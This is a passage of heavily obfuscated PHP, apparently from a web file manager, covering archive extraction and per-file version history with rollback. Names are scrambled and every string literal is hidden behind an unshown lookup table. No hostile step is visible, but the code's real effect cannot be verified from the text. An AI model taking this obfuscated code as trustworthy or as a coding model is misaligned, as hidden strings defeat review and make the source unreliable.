$óÌÑ™™û[8]) { $«Ù¼©Ö¡ = $•éÂéóŸ[$óÌÑ™™û[1197]] . rand_string(10) . $óÌÑ™™û[8]; mk_dir($«Ù¼©Ö¡); $»ô¡ã³ë = count($•éÂéóŸ[$óÌÑ™™û[1195]]) == 1 ? IO::ext($ƒ‚Äù¬Ÿ) : get_path_ext($•éÂéóŸ[$óÌÑ™™û[199]]); $ú„Ã•íæ = KodArchive::extract(self::iconvSystem($•éÂéóŸ[$óÌÑ™™û[199]]), $«Ù¼©Ö¡, $óÒëƒÒ‰[$óÌÑ™™û[1196]], $…¥Œİëß, $»ô¡ã³ë); self::unzipErrorCheck($ú„Ã•íæ, array($óÌÑ™™û[1198], $ƒ‚Äù¬Ÿ, $»ô¡ã³ë, $öê¦Š¹µ, $•éÂéóŸ)); Hook::trigger($óÌÑ™™û[1199], $«Ù¼©Ö¡); recursion_dir($«Ù¼©Ö¡, $—ÆÚş…Ù, $·¨ÑÌñ‚, 0); $ù©«ïÅ = array_merge($—ÆÚş…Ù, $·¨ÑÌñ‚); $×ëŸë¢û = array(); foreach ($ù©«ïÅ as $š¹¬“¾ş) { $ùÁšÎË’ = IO::move(self::iconvApp($š¹¬“¾ş), $öê¦Š¹µ, $âƒ­±é›); if ($ùÁšÎË’) { $×ëŸë¢û[] = $ùÁšÎË’; } } del_dir($«Ù¼©Ö¡); } else { $ùÁšÎË’ = IO::move($•éÂéóŸ[$óÌÑ™™û[199]], $öê¦Š¹µ, $âƒ­±é›, get_path_this($óÒëƒÒ‰[$óÌÑ™™û[32]])); if ($ùÁšÎË’) { $×ëŸë¢û[] = $ùÁšÎË’; } } return $×ëŸë¢û ? $×ëŸë¢û : !1; } public static function unzipList($ÆÌõ¼¨ª) { $õñúÄÔ =& $_SERVER[ùÆÎÔ“Ñ]; $õ‹‹õ¡¿ = isset($ÆÌõ¼¨ª[$õñúÄÔ[1200]]) ? $ÆÌõ¼¨ª[$õñúÄÔ[1200]] : !1; $§ÆğœçÉ = isset($ÆÌõ¼¨ª[$õñúÄÔ[1196]]) ? @json_decode($ÆÌõ¼¨ª[$õñúÄÔ[1196]], !0) : -1; $á£õ¾Ö¶ = self::unzipPart($ÆÌõ¼¨ª[$õñúÄÔ[84]], $§ÆğœçÉ); if (!$á£õ¾Ö¶ || !IO::exist($á£õ¾Ö¶[$õñúÄÔ[199]])) { show_json(LNG($õñúÄÔ[105]), !1); } $Œ…ŞöÉ÷ = $á£õ¾Ö¶[$õñúÄÔ[1195]][count($á£õ¾Ö¶[$õñúÄÔ[1195]]) - 1]; $ºÜ¦Úã– = in_array(IO::ext($á£õ¾Ö¶[$õñúÄÔ[199]]), array($õñúÄÔ[313], $õñúÄÔ[1201], $õñúÄÔ[1202], $õñúÄÔ[1203], $õñúÄÔ[1204], $õñúÄÔ[1205])); if (!$õ‹‹õ¡¿ && ($Œ…ŞöÉ÷[$õñúÄÔ[1196]] == -1 || $ºÜ¦Úã–)) { $ªúâøÏ‚ = $á£õ¾Ö¶[$õñúÄÔ[1197]] . get_path_this($á£õ¾Ö¶[$õñúÄÔ[199]]) . $õñúÄÔ[1206]; if (!IO::exist($ªúâøÏ‚)) { $ÔÉõŠÄñ = $Œ…ŞöÉ÷[$õñúÄÔ[1196]] == -1 ? get_path_ext(IO::pathThis($ÆÌõ¼¨ª[$õñúÄÔ[84]])) : get_path_ext($á£õ¾Ö¶[$õñúÄÔ[199]]); $ˆˆ”¨û‘ = KodArchive::listContent(self::iconvSystem($á£õ¾Ö¶[$õñúÄÔ[199]]), !0, $ÔÉõŠÄñ); self::unzipErrorCheck($ˆˆ”¨û‘, array($õñúÄÔ[1207], $ÆÌõ¼¨ª, $á£õ¾Ö¶)); @file_put_contents($ªúâøÏ‚, json_encode($ˆˆ”¨û‘[$õñúÄÔ[1208]])); } return @json_decode(IO::getContent($ªúâøÏ‚), !0); } IO::fileOut($á£õ¾Ö¶[$õñúÄÔ[199]], $õ‹‹õ¡¿, get_path_this($Œ…ŞöÉ÷[$õñúÄÔ[32]])); die; } private static function zipFileList($Ë‹íµ‰­, $Ú·¼„ùÙ = false) { $¼¨·ÅÖÉ =& $_SERVER[ùÆÎÔ“Ñ]; $ÀÎ§ï¿ = array(); foreach ($Ë‹íµ‰­ as $à¹ò¨ ) { $‰ï×œ‡ = $à¹ò¨ [$¼¨·ÅÖÉ[84]]; if ($Ú·¼„ùÙ) { $‰ï×œ‡ = self::copy($à¹ò¨ [$¼¨·ÅÖÉ[84]], $Ú·¼„ùÙ, $¼¨·ÅÖÉ[819]); } else { $Ö©õˆ¨Ñ = self::init($à¹ò¨ [$¼¨·ÅÖÉ[84]]); if ($Ö©õˆ¨Ñ->getType() == $¼¨·ÅÖÉ[106]) { $‰ï×œ‡ = $Ö©õˆ¨Ñ->path; } } if ($‰ï×œ‡ && self::local()->exist($‰ï×œ‡)) { $ÀÎ§ï¿[$à¹ò¨ [$¼¨·ÅÖÉ[84]]] = $‰ï×œ‡; } } if (!empty($ÀÎ§ï¿)) { return array_values($ÀÎ§ï¿); } show_json(LNG($¼¨·ÅÖÉ[1171]), !1); } private static function localFilePath($¹îƒ€‰) { $¼…ÃˆÇÂ =& $_SERVER[ùÆÎÔ“Ñ]; $¹ş‰»Œä = KodIO::parse($¹îƒ€‰); if ($¹ş‰»Œä[$¼…ÃˆÇÂ[33]] == KodIO::KOD_SOURCE) { $æôØª¤É = Model($¼…ÃˆÇÂ[826])->fileInfoGet(KodIO::sourceID($¹îƒ€‰)); if (!$æôØª¤É[$¼…ÃˆÇÂ[84]]) { show_json($¼…ÃˆÇÂ[1209], !1); } $¹îƒ€‰ = $æôØª¤É[$¼…ÃˆÇÂ[84]]; } $ûÜ†ï‚ä = self::init($¹îƒ€‰); if ($ûÜ†ï‚ä->pathParse[$¼…ÃˆÇÂ[1156]]) { $¹îƒ€‰ = $ûÜ†ï‚ä->pathParse[$¼…ÃˆÇÂ[1156]]; $ûÜ†ï‚ä = self::init($¹îƒ€‰); } $™ÊÕöËİ = $ûÜ†ï‚ä->getType(); if ($™ÊÕöËİ == $¼…ÃˆÇÂ[106] || $™ÊÕöËİ == $¼…ÃˆÇÂ[1210]) { if (!$ûÜ†ï‚ä->exist($ûÜ†ï‚ä->path)) { show_json(LNG($¼…ÃˆÇÂ[105]), !1); } return $ûÜ†ï‚ä->path; } return !1; } public static function unzipPart($õç·³‘ï, $æÏ¨ğ“Å = -1) { $¾½†¡‡ =& $_SERVER[ùÆÎÔ“Ñ]; $¦Ø¼´Ä = IO::pathThis($õç·³‘ï); if (!$æÏ¨ğ“Å || $æÏ¨ğ“Å == -1) { $Ï©‚úÒ = array(array($¾½†¡‡[32] => $¦Ø¼´Ä, $¾½†¡‡[1196] => -1)); $Ï©‚úÒ[0][$¾½†¡‡[1211]] = $Ï©‚úÒ[0][$¾½†¡‡[32]]; } else { if (is_array($æÏ¨ğ“Å)) { $Ï©‚úÒ = $æÏ¨ğ“Å; $êûúÚé¤ = count($Ï©‚úÒ) - 1; for ($¦¦Ëœ×• = 0; $¦¦Ëœ×• <= $êûúÚé¤; $¦¦Ëœ×•++) { $¼ÕËêÂş = $Ï©‚úÒ[$¦¦Ëœ×•]; $å½ì¶Ú = get_path_this($¼ÕËêÂş[$¾½†¡‡[32]]) . (checkExtSafe($¼ÕËêÂş[$¾½†¡‡[32]]) ? $¾½†¡‡[12] : $¾½†¡‡[1212]); $Ï©‚úÒ[$¦¦Ëœ×•][$¾½†¡‡[1211]] = $¾½†¡‡[1213] . intval($¼ÕËêÂş[$¾½†¡‡[1196]]) . $¾½†¡‡[386] . $å½ì¶Ú; if ($¦¦Ëœ×• == 0) { continue; } $Ï©‚úÒ[$¦¦Ëœ×•][$¾½†¡‡[1211]] = $Ï©‚úÒ[$¦¦Ëœ×• - 1][$¾½†¡‡[1211]] . $¾½†¡‡[1214] . $Ï©‚úÒ[$¦¦Ëœ×•][$¾½†¡‡[1211]]; } } } if (!is_array($Ï©‚úÒ) || count($Ï©‚úÒ) == 0) { return !1; } $™·¸Œ°§ = $Ï©‚úÒ[count($Ï©‚úÒ) - 1]; if (!IO::exist($õç·³‘ï)) { return !1; } $íû½šñ = TEMP_FILES . $¾½†¡‡[1215] . kodIO::hashPathSafe($õç·³‘ï) . $¾½†¡‡[8]; $‹ÁèúéÎ = $íû½šñ . $™·¸Œ°§[$¾½†¡‡[1211]]; mk_dir($íû½šñ); file_put_contents(TEMP_FILES . $¾½†¡‡[1190], $¾½†¡‡[12]); if (IO::exist($‹ÁèúéÎ)) { return array($¾½†¡‡[199] => $‹ÁèúéÎ, $¾½†¡‡[1195] => $Ï©‚úÒ, $¾½†¡‡[1197] => $íû½šñ); } $Ï©Œ§¸¦ = self::localFilePath($õç·³‘ï); if (!$Ï©Œ§¸¦) { $Ï©Œ§¸¦ = $íû½šñ . $¾½†¡‡[1216]; if (!IO::exist($Ï©Œ§¸¦)) { self::copy($õç·³‘ï, $íû½šñ, !1, get_path_this($Ï©Œ§¸¦)); } } if (!$Ï©Œ§¸¦ || !IO::exist($Ï©Œ§¸¦)) { return !1; } if ($™·¸Œ°§[$¾½†¡‡[1196]] == -1) { return array($¾½†¡‡[199] => $Ï©Œ§¸¦, $¾½†¡‡[1195] => $Ï©‚úÒ, $¾½†¡‡[1197] => $íû½šñ); } $¶ê“‰ìß = $Ï©Œ§¸¦; foreach ($Ï©‚úÒ as $¦¦Ëœ×• => $¼ÕËêÂş) { if (!$¼ÕËêÂş || $¼ÕËêÂş[$¾½†¡‡[1196]] == $¾½†¡‡[1194]) { break; } if (substr($¼ÕËêÂş[$¾½†¡‡[32]], -1, 1) == $¾½†¡‡[8]) { break; } $ªáÜ¢ª£ = in_array(get_path_ext($¼ÕËêÂş[$¾½†¡‡[1211]]), array($¾½†¡‡[313], $¾½†¡‡[1201], $¾½†¡‡[1202], $¾½†¡‡[1203], $¾½†¡‡[1204], $¾½†¡‡[1205])); $¸Î˜àÍå = $¦¦Ëœ×• == count($Ï©‚úÒ) - 1 && $ªáÜ¢ª£; $¾——™ÀË = $íû½šñ . $¼ÕËêÂş[$¾½†¡‡[1211]]; $©±Ë´ = $íû½šñ . get_path_this($¼ÕËêÂş[$¾½†¡‡[32]]); if (IO::exist($¾——™ÀË)) { $¶ê“‰ìß = $¾——™ÀË; continue; } $­â¡’ùå = $¦¦Ëœ×• == 0 ? get_path_ext($¦Ø¼´Ä) : get_path_ext($¶ê“‰ìß); $°ïÓ¿»› = KodArchive::extract(self::iconvSystem($¶ê“‰ìß), $íû½šñ, $¼ÕËêÂş[$¾½†¡‡[1196]], $ßŠ†ËÚ¨, $­â¡’ùå); self::unzipErrorCheck($°ïÓ¿»›, array($¾½†¡‡[1217], $õç·³‘ï, $Ï©‚úÒ, $¼ÕËêÂş, $¾——™ÀË)); if (IO::exist($©±Ë´)) { IO::rename($©±Ë´, get_path_this($¾——™ÀË)); } $¶ê“‰ìß = $¾——™ÀË; } $‹ÁèúéÎ = $¶ê“‰ìß; return array($¾½†¡‡[199] => $¶ê“‰ìß, $¾½†¡‡[1195] => $Ï©‚úÒ, $¾½†¡‡[1197] => $íû½šñ); } private static function unzipErrorCheck($õÍªÒ•Û, $ÜáÌÄĞ¼ = false) { $²Ÿú¶º¢ =& $_SERVER[ùÆÎÔ“Ñ]; if ($õÍªÒ•Û[$²Ÿú¶º¢[1218]]) { return !0; } write_log(array($²Ÿú¶º¢[1219], $õÍªÒ•Û, $ÜáÌÄĞ¼), $²Ÿú¶º¢[1220]); show_json($²Ÿú¶º¢[1221] . json_encode($õÍªÒ•Û[$²Ÿú¶º¢[1208]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Œàâ¦í… =& $_SERVER[ùÆÎÔ“Ñ]; $÷–ç¹”Î = $GLOBALS[$Œàâ¦í…[6]][$Œàâ¦í…[89]]; if ($÷–ç¹”Î[$Œàâ¦í…[1222]] != 1) { return; } if ($÷–ç¹”Î[$Œàâ¦í…[1223]] <= 0) { return; } if (isset($_REQUEST[$Œàâ¦í…[1224]]) && $_REQUEST[$Œàâ¦í…[1224]] == $Œàâ¦í…[88]) { return; } Hook::bind($Œàâ¦í…[1225], $Œàâ¦í…[1226]); Hook::bind($Œàâ¦í…[1227], $Œàâ¦í…[1228]); Hook::bind($Œàâ¦í…[1229], $Œàâ¦í…[1230]); Hook::bind($Œàâ¦í…[1231], $Œàâ¦í…[1232]); Hook::bind($Œàâ¦í…[1233], $Œàâ¦í…[1234]); Hook::bind($Œàâ¦í…[1235], $Œàâ¦í…[1236]); } public static function eventBeforeUpload($¢û”Âá²) { if ($¢û”Âá²[3] && $¢û”Âá²[3] != REPEAT_REPLACE) { return; } $“—ÖÊ­ç = self::parsePath($¢û”Âá²[0]); if (!$“—ÖÊ­ç) { return; } self::add($“—ÖÊ­ç); } public static function eventBeforeEdit($İõ©ïø) { $‘„ëŸ™‚ = self::parsePath($İõ©ïø[0]); if (!$‘„ëŸ™‚) { return; } self::add($‘„ëŸ™‚); } public static function eventBeforeCopyFile($ûçˆ€­, $°ŒÌƒ, $ğƒ‘Öˆ±, $²•‘, $Íô¬µÄ, $Ğ»¼¯ìÕ) { $³ŒĞú²“ =& $_SERVER[ùÆÎÔ“Ñ]; if (isset($ğƒ‘Öˆ±->_data[$³ŒĞú²“[1160]]) && $ğƒ‘Öˆ±->_data[$³ŒĞú²“[1160]]) { return; } $¿¿µü±ı = $ğƒ‘Öˆ±->getPathOuter($²•‘); $Œòóù¸Ö = self::parsePath($¿¿µü±ı); if (!$Œòóù¸Ö) { return; } self::add($Œòóù¸Ö); } public static function eventBeforeRename($ç»êŒ“Ş) { $áÓïãÜ· =& $_SERVER[ùÆÎÔ“Ñ]; $Õœ²ş­ï = self::parsePath($ç»êŒ“Ş[0]); if (!$Õœ²ş­ï) { return; } $¡“¸ÜÃ¡ = self::checkInHistory($Õœ²ş­ï); if (!$¡“¸ÜÃ¡) { return; } if ($¡“¸ÜÃ¡[$áÓïãÜ·[33]] == $áÓïãÜ·[199]) { $œ¾íô®ª = self::listData($Õœ²ş­ï); if ($œ¾íô®ª && $œ¾íô®ª[$áÓïãÜ·[369]]) { self::moveHistory($Õœ²ş­ï, $ç»êŒ“Ş[1]); } } else { IO::rename($¡“¸ÜÃ¡[$áÓïãÜ·[84]], $ç»êŒ“Ş[1]); } } public static function eventBeforeMove($ìÜ›±¯´) { $¯­êïÚ˜ =& $_SERVER[ùÆÎÔ“Ñ]; $ÈÏÏâ®¦ = self::parsePath($ìÜ›±¯´[0]); if (!$ÈÏÏâ®¦) { return; } $Õ¡¬ğ•¾ = self::parsePath($ìÜ›±¯´[1]); if (!$Õ¡¬ğ•¾) { return; } $Ñá¤ÎŒæ = $ìÜ›±¯´[3]; $ıÒûòíÔ = self::checkInHistory($ÈÏÏâ®¦); if (!$ıÒûòíÔ) { return; } $åµıò­á = self::pathHistory($Õ¡¬ğ•¾); if ($ıÒûòíÔ[$¯­êïÚ˜[33]] == $¯­êïÚ˜[199]) { $ñÏŞá™æ = self::listData($ÈÏÏâ®¦); $‘‘Ëã¹‘ = rtrim($Õ¡¬ğ•¾, $¯­êïÚ˜[8]) . $¯­êïÚ˜[8] . ($Ñá¤ÎŒæ ? $Ñá¤ÎŒæ : get_path_this($ÈÏÏâ®¦)); $³´¶¤Ã = self::listData($‘‘Ëã¹‘); if ($ñÏŞá™æ && $ñÏŞá™æ[$¯­êïÚ˜[369]] && $³´¶¤Ã && $³´¶¤Ã[$¯­êïÚ˜[369]]) { return self::clear($ÈÏÏâ®¦); } if ($ñÏŞá™æ && $ñÏŞá™æ[$¯­êïÚ˜[369]]) { self::moveHistory($ÈÏÏâ®¦, $Ñá¤ÎŒæ, $åµıò­á); } } else { IO::move($ıÒûòíÔ[$¯­êïÚ˜[84]], $åµıò­á, !1, $Ñá¤ÎŒæ); self::clearEmptyFolder(IO::pathFather($ıÒûòíÔ[$¯­êïÚ˜[84]])); } } public static function eventAfterRemove($êù‡ì¼®, $áÔşİ¸å) { $‚€¶õíì =& $_SERVER[ùÆÎÔ“Ñ]; if (!$áÔşİ¸å) { return; } $ªú”£î° = self::parsePath($êù‡ì¼®[0]); if (!$ªú”£î°) { return; } $ÍÎó¾ã€ = self::checkInHistory($ªú”£î°); if (!$ÍÎó¾ã€) { return; } if ($ÍÎó¾ã€[$‚€¶õíì[33]] == $‚€¶õíì[199]) { $æúŠòğÇ = self::listData($ªú”£î°, !1); if ($æúŠòğÇ && $æúŠòğÇ[$‚€¶õíì[369]]) { self::clear($ªú”£î°, !1); } } else { IO::remove($ÍÎó¾ã€[$‚€¶õíì[84]]); self::clearEmptyFolder(IO::pathFather($ÍÎó¾ã€[$‚€¶õíì[84]])); } } private static function checkInHistory($·îşñŒ´) { $ƒëë®åØ = self::pathHistory($·îşñŒ´); if (!IO::exist($ƒëë®åØ)) { $ƒëë®åØ .= $_SERVER[ùÆÎÔ“Ñ][1237]; } return IO::exist($ƒëë®åØ) ? IO::info($ƒëë®åØ) : !1; } private static function parsePath($ûÍğ£ëø) { $ˆ„ˆÒ· =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ûÍğ£ëø) { return !1; } if ($GLOBALS[$ˆ„ˆÒ·[1238]]) { return; } $–¥¨‚ = KodIO::parse($ûÍğ£ëø); $¾Šıî„ô = $–¥¨‚[$ˆ„ˆÒ·[33]]; $–Ø§Ğä– = !$¾Šıî„ô || $¾Šıî„ô == KodIO::KOD_IO || $¾Šıî„ô == KodIO::KOD_SHARE_ITEM; if (!$–Ø§Ğä– || !$–¥¨‚[$ˆ„ˆÒ·[1239]]) { return !1; } if (substr($ûÍğ£ëø, 0, strlen(DATA_PATH . $ˆ„ˆÒ·[1240])) == DATA_PATH . $ˆ„ˆÒ·[1240]) { return !1; } if ($¾Šıî„ô == KodIO::KOD_SHARE_ITEM) { $±Ñ†Ğ‹ = IO::init($ûÍğ£ëø); if ($±Ñ†Ğ‹->pathParse[$ˆ„ˆÒ·[1156]]) { return self::parsePath($±Ñ†Ğ‹->pathParse[$ˆ„ˆÒ·[1156]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Œ²ÛÉÃº = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ˆ„ˆÒ·[1241]); foreach ($Œ²ÛÉÃº as $Ñ¿›§Óè) { if (!$¾Šıî„ô && substr($ûÍğ£ëø, 0, strlen($Ñ¿›§Óè)) == $Ñ¿›§Óè) { return !1; } } self::log($GLOBALS[$ˆ„ˆÒ·[1151]] . $ˆ„ˆÒ·[1242] . $ûÍğ£ëø); return $ûÍğ£ëø; } private static function pathHistory($Éıƒç¡Ì) { $ÅÅ³Ç˜¢ =& $_SERVER[ùÆÎÔ“Ñ]; $ªùªÕ‹Ù = self::$_historyBase . ltrim(KodIO::clear($Éıƒç¡Ì), $ÅÅ³Ç˜¢[8]); $ªùªÕ‹Ù = str_replace(array($ÅÅ³Ç˜¢[1243]), array($ÅÅ³Ç˜¢[1244]), $ªùªÕ‹Ù); return $ªùªÕ‹Ù; } public static function log($àÌÃ„Ä) { } public static function historyCount($²‹¥ùœÀ) { $ ÇÎàÈş =& $_SERVER[ùÆÎÔ“Ñ]; $¹„ÍÉÊ¤ = array(); $Ğö¹Ôì = array(); foreach ($²‹¥ùœÀ as $İ«ì¤²·) { $”‹õŒ—ƒ = get_path_father($İ«ì¤²·); if (!$Ğö¹Ôì[$”‹õŒ—ƒ]) { $Ğö¹Ôì[$”‹õŒ—ƒ] = array(); } $Ğö¹Ôì[$”‹õŒ—ƒ][] = get_path_this($İ«ì¤²·); } foreach ($Ğö¹Ôì as $”‹õŒ—ƒ => $âöèğ¼ù) { $²Ü£œ¥ = self::parsePath($”‹õŒ—ƒ); if (!$²Ü£œ¥) { continue; } foreach ($âöèğ¼ù as $“´àøîÓ) { $¡ ¯‘Ñ = self::listData(rtrim($²Ü£œ¥, $ ÇÎàÈş[8]) . $ ÇÎàÈş[8] . $“´àøîÓ, !1); if ($¡ ¯‘Ñ && $¡ ¯‘Ñ[$ ÇÎàÈş[369]]) { $¹„ÍÉÊ¤[rtrim($”‹õŒ—ƒ, $ ÇÎàÈş[8]) . $ ÇÎàÈş[8] . $“´àøîÓ] = count($¡ ¯‘Ñ[$ ÇÎàÈş[369]]); } } } return $¹„ÍÉÊ¤; } public static function add($èúÛûğ ) { $˜âéóïà =& $_SERVER[ùÆÎÔ“Ñ]; $Æ»µîÆÃ = self::listData($èúÛûğ ); if (!$Æ»µîÆÃ) { return; } $ÒŞö´š› = Model($˜âéóïà[771])->get($˜âéóïà[1245]); $Ô“…êˆŒ = $GLOBALS[$˜âéóïà[6]][$˜âéóïà[89]][$˜âéóïà[1223]]; $—˜ÕÆÄè = $ÒŞö´š› == $˜âéóïà[1246] ? min(5, $Ô“…êˆŒ) : $Ô“…êˆŒ; if ($Ô“…êˆŒ <= 0) { return; } $­³Ú¶‰ú = IO::info($èúÛûğ ); $¤›¡ßïç = $Æ»µîÆÃ[$˜âéóïà[369]]; if ($­³Ú¶‰ú[$˜âéóïà[76]] == 0) { return; } if ($­³Ú¶‰ú[$˜âéóïà[76]] >= 1024 * 1024 * 500) { return !1; } $»«ß³ÁÈ = IO::hashSimple($èúÛûğ ); if ($¤›¡ßïç && $¤›¡ßïç[0][$˜âéóïà[177]] == $»«ß³ÁÈ) { return !0; } if (array_key_exists($˜âéóïà[202], $­³Ú¶‰ú) && !$­³Ú¶‰ú[$˜âéóïà[202]]) { return !1; } $œ™ßóš = short_id(time()); $›ĞàÓ”ø = array($˜âéóïà[399] => $œ™ßóš, $˜âéóïà[177] => $»«ß³ÁÈ, $˜âéóïà[32] => $­³Ú¶‰ú[$˜âéóïà[32]] . $˜âéóïà[10] . date($˜âéóïà[1247]) . rand_string(1), $˜âéóïà[76] => $­³Ú¶‰ú[$˜âéóïà[76]], $˜âéóïà[454] => USER_ID, $˜âéóïà[200] => time(), $˜âéóïà[1248] => $˜âéóïà[12]); IO::mkdir($Æ»µîÆÃ[$˜âéóïà[1249]]); $¸ãÒ—Ñì = IO::copy($èúÛûğ , $Æ»µîÆÃ[$˜âéóïà[1249]], !1, $›ĞàÓ”ø[$˜âéóïà[32]]); if (!$¸ãÒ—Ñì) { self::clearEmptyFolder($Æ»µîÆÃ[$˜âéóïà[1249]]); return !1; } array_unshift($¤›¡ßïç, $›ĞàÓ”ø); if (count($¤›¡ßïç) > $—˜ÕÆÄè) { $ø¸¢Ü¼ğ = array_slice($¤›¡ßïç, $—˜ÕÆÄè); foreach ($ø¸¢Ü¼ğ as $ãéù·¿Æ) { IO::remove($Æ»µîÆÃ[$˜âéóïà[1249]] . $ãéù·¿Æ[$˜âéóïà[32]]); } $¤›¡ßïç = array_slice($¤›¡ßïç, 0, $—˜ÕÆÄè); } return self::saveData($Æ»µîÆÃ[$˜âéóïà[1250]], $¤›¡ßïç); } public static function remove($ıšÁİ˜‚, $üığÔÎé) { $»óÏó—‡ =& $_SERVER[ùÆÎÔ“Ñ]; $áÑ‚ïãö = self::listData($ıšÁİ˜‚); $›­õ’ôà = array(); if (!$áÑ‚ïãö) { return !1; } foreach ($áÑ‚ïãö[$»óÏó—‡[369]] as $É´ğ˜Ñå) { if ($É´ğ˜Ñå[$»óÏó—‡[399]] == $üığÔÎé) { IO::remove($áÑ‚ïãö[$»óÏó—‡[1249]] . $É´ğ˜Ñå[$»óÏó—‡[32]]); continue; } $›­õ’ôà[] = $É´ğ˜Ñå; } return self::saveData($áÑ‚ïãö[$»óÏó—‡[1250]], $›­õ’ôà); } public static function clear($á¶èïø©, $É¼ı†¡Ô = true) { $äî´¬§Ä =& $_SERVER[ùÆÎÔ“Ñ]; $ºƒîº²Ã = self::listData($á¶èïø©, $É¼ı†¡Ô); if (!$ºƒîº²Ã) { return !1; } foreach ($ºƒîº²Ã[$äî´¬§Ä[369]] as $†ëî¯»–) { IO::remove($ºƒîº²Ã[$äî´¬§Ä[1249]] . $†ëî¯»–[$äî´¬§Ä[32]]); } return self::saveData($ºƒîº²Ã[$äî´¬§Ä[1250]], array()); } public static function moveHistory($¼¼ª¶ó˜, $¥Íµş°å = '', $›Ÿ—èÀ° = '') { $ØÌ¨úˆÑ =& $_SERVER[ùÆÎÔ“Ñ]; $Ş¢Ÿé±½ = self::listData($¼¼ª¶ó˜, !1); if (!$Ş¢Ÿé±½ || !$Ş¢Ÿé±½[$ØÌ¨úˆÑ[369]]) { return !1; } $ÙìèË´¹ = $ØÌ¨úˆÑ[1237]; $¥Íµş°å = $¥Íµş°å ? $¥Íµş°å : get_path_this($¼¼ª¶ó˜); $›Ÿ—èÀ° = $›Ÿ—èÀ° ? $›Ÿ—èÀ° : $Ş¢Ÿé±½[$ØÌ¨úˆÑ[1249]]; $¼´¬¿¼ = substr(get_path_this($Ş¢Ÿé±½[$ØÌ¨úˆÑ[1250]]), 0, -strlen($ÙìèË´¹)); foreach ($Ş¢Ÿé±½[$ØÌ¨úˆÑ[369]] as $Í‚èÑ– => $ï…ÕõúÈ) { $µâæòšà = $¥Íµş°å . substr($ï…ÕõúÈ[$ØÌ¨úˆÑ[32]], strlen($¼´¬¿¼)); $ï³…‰Ä  = IO::move($Ş¢Ÿé±½[$ØÌ¨úˆÑ[1249]] . $ï…ÕõúÈ[$ØÌ¨úˆÑ[32]], $›Ÿ—èÀ°, !1, $µâæòšà); if ($ï³…‰Ä ) { $Ş¢Ÿé±½[$ØÌ¨úˆÑ[369]][$Í‚èÑ–][$ØÌ¨úˆÑ[32]] = $µâæòšà; } } $Ş¢Ÿé±½[$ØÌ¨úˆÑ[1250]] = IO::move($Ş¢Ÿé±½[$ØÌ¨úˆÑ[1250]], $›Ÿ—èÀ°, !1, $¥Íµş°å . $ÙìèË´¹); self::saveData($Ş¢Ÿé±½[$ØÌ¨úˆÑ[1250]], $Ş¢Ÿé±½[$ØÌ¨úˆÑ[369]]); self::clearEmptyFolder($Ş¢Ÿé±½[$ØÌ¨úˆÑ[1249]]); } public static function rollback($¸ÂÏôïŸ, $Ñ¼¬Ì²Ë) { $âèÊë†© =& $_SERVER[ùÆÎÔ“Ñ]; $óµ¡ğË = self::listData($¸ÂÏôïŸ); if (!$óµ¡ğË) { return; } $Å«ä½ã± = IO::info($¸ÂÏôïŸ); foreach ($óµ¡ğË[$âèÊë†©[369]] as $˜—ß¶È => $ÚÜ·Û½Ÿ) { if ($ÚÜ·Û½Ÿ[$âèÊë†©[399]] == $Ñ¼¬Ì²Ë) { self::add($¸ÂÏôïŸ); $Ç•ó‹Ù» = $óµ¡ğË[$âèÊë†©[1249]] . $ÚÜ·Û½Ÿ[$âèÊë†©[32]]; $ÕÒæ£üæ = IO::copy($Ç•ó‹Ù», IO::pathFather($¸ÂÏôïŸ), REPEAT_REPLACE, $Å«ä½ã±[$âèÊë†©[32]]); if ($ÕÒæ£üæ) { self::remove($¸ÂÏôïŸ, $Ñ¼¬Ì²Ë); } return $ÕÒæ£üæ; } } return !1; } public static function setDetail($¡Ãé”Äµ, $¾íÌ€à¥, $ƒÓ§Ş‹¼) { $äû¢·ò¾ =& $_SERVER[ùÆÎÔ“Ñ]; $ÙÙşõÖ² = self::listData($¡Ãé”Äµ); if (!$ÙÙşõÖ²) { return; } foreach ($ÙÙşõÖ²[$äû¢·ò¾[369]] as $§Áºğøë => $ÂÓ÷Îú) { if ($ÂÓ÷Îú[$äû¢·ò¾[399]] == $¾íÌ€à¥) { $ÙÙşõÖ²[$äû¢·ò¾[369]][$§Áºğøë][$äû¢·ò¾[1248]] = $ƒÓ§Ş‹¼; self::saveData($ÙÙşõÖ²[$äû¢·ò¾[1250]], $ÙÙşõÖ²[$äû¢·ò¾[369]]); return !0; } } return !1; } public static function fileInfo($á’”³ĞÜ, $‡ÆÌª‡é) { $ÙÕÇê¼ =& $_SERVER[ùÆÎÔ“Ñ]; $¹Ş•Ò—À = self::listData($á’”³ĞÜ); if (!$¹Ş•Ò—À) { show_json(LNG($ÙÕÇê¼[105]), !1); } $Óèàœ§÷ = $ÙÕÇê¼[12]; foreach ($¹Ş•Ò—À[$ÙÕÇê¼[369]] as $Â¢ÔÉ£Ì => $Ú²àËò) { if ($Ú²àËò[$ÙÕÇê¼[399]] != $‡ÆÌª‡é) { continue; } $Óèàœ§÷ = $¹Ş•Ò—À[$ÙÕÇê¼[1249]] . $Ú²àËò[$ÙÕÇê¼[32]]; break; } if (!$Óèàœ§÷) { show_json(LNG($ÙÕÇê¼[105]), !1); } return IO::info($Óèàœ§÷); } public static function fileOut($¤à²¡‡ï, $™ßÚ¹±œ, $Ê¾¾ú˜³ = false) { $º£¾¢Ş =& $_SERVER[ùÆÎÔ“Ñ]; $ÄÆ‡¿§ = self::fileInfo($¤à²¡‡ï, $™ßÚ¹±œ); $¾úÆæÆĞ =& $GLOBALS[$º£¾¢Ş[7]]; $Ê¾¾ú˜³ = isset($¾úÆæÆĞ[$º£¾¢Ş[1200]]) && $¾úÆæÆĞ[$º£¾¢Ş[1200]] == 1; if (isset($¾úÆæÆĞ[$º£¾¢Ş[33]]) && $¾úÆæÆĞ[$º£¾¢Ş[33]] == $º£¾¢Ş[1251]) { return IO::fileOutImage($ÄÆ‡¿§[$º£¾¢Ş[84]], $¾úÆæÆĞ[$º£¾¢Ş[1252]]); } IO::fileOut($ÄÆ‡¿§[$º£¾¢Ş[84]], $Ê¾¾ú˜³, get_path_this($¤à²¡‡ï)); } public static function listData($±Ğ–‚õ¤, $©ü¢ÈŠ× = true) { $ĞÛ…•şí =& $_SERVER[ùÆÎÔ“Ñ]; if ($©ü¢ÈŠ× && !IO::exist($±Ğ–‚õ¤)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = 